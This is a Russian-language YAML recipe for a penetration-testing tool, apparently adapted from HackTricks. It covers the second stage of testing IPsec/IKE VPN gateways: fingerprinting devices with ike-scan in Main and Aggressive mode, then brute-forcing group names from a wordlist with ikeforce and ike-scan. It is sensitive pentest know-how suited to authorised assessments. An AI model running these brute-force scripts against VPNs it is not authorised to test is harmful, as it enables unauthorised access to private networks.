description: |-
  Этап 2 тестирования isakmp
  Возможен только если на предыдущем этапе были получены доступные трансформации

  Статьи:
  https://book.hacktricks.xyz/network-services-pentesting/ipsec-ike-vpn-pentesting
  https://xakep.ru/2015/05/13/ipsec-security-flaws/
author: hacktricks
tags:
  - isakmp
  - IKE
  - IPsec
  - 500
  - 4500
  - udp
  - ike-scan
  - ikeforce
install:
  sudo apt install ike-scan
  docker pull elrey741/ikeforce
arguments:
  targs:
    default:
    replacer: __TARGS__
    description: >-
      Хосты для тестирования с указанными трансформациями (пример: '10.0.1.1:4,3,3,1 10.0.1.3:1,2,3,1')
  worldlist:
    default:
    replacer: __FILE__
    description: >-
      Путь до словаря имен групп (можно взять на hacktricks.xyz)
shell: /bin/bash
script:
item_1:
  description: Получение отпечатков устройства (Main Mode)
  script: >-
    for targ in __TARGS__; do echo "+ Testing $targ"; sudo ike-scan -M --showbackoff --trans=$(echo $targ | cut -f2 -d:) $(echo $targ | cut -f1 -d:); echo -e; done
item_2:
  description: Получение отпечатков устройства (Aggressive Mode)
  script: >-
    for targ in __TARGS__; do echo "+ Testing $targ"; sudo ike-scan -M -A --showbackoff --trans=$(echo $targ | cut -f2 -d:) $(echo $targ | cut -f1 -d:); echo -e; done
item_3:
  description: Брут имен групп с помощью ikeforce (только Aggressive mode) (заодно подсветит, верна трансформация, или нет)
  script: >-
    for targ in __TARGS__; do echo "+ Testing $targ"; docker container run -v $(dirname $(realpath __FILE__)):'/temp' --read-only --rm -ti --name ikeforce elrey741/ikeforce $(echo $targ | cut -f1 -d:) -e -w /temp/$(basename $(realpath __FILE__)) -t $(echo $targ | cut -f2 -d: | tr ',' ' '); done
item_4:
  description: Брут с помощью ike-scan (только Aggressive mode)
  script: |-
    for targ in __TARGS__; do
      echo "+ Testing $targ";
      test=$(sudo ike-scan -M -A -n groupnamedoesnotexist --trans=$(echo $targ | cut -f2 -d:) $(echo $targ | cut -f1 -d:) | grep -B14 "1 returned handshake"; )
      if [ -n "$test" ]; then
        echo '- Brute Forcing ID with ike-scan is impossible'
      else
        while read line; do (echo "Found ID: $line" && sudo ike-scan -M -A -n $line --trans=$(echo $targ | cut -f2 -d:) $(echo $targ | cut -f1 -d:)) | grep -B14 "1 returned handshake" | grep "Found ID:"; done < __FILE__
      fi
    done; echo -e
